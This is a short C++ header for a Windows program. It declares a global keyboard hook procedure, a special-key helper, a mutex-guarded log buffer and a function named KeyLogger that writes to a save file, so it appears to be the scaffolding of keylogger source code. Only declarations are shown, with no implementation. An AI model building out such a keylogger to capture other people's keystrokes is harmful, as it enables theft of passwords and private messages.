#pragma once

#include <windows.h>
#include <fstream>
#include <mutex>

std::mutex logMutex;
std::string logData;

bool SpecialKeys(int S_Key);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
bool KeyLogger(const std::string &saveFile);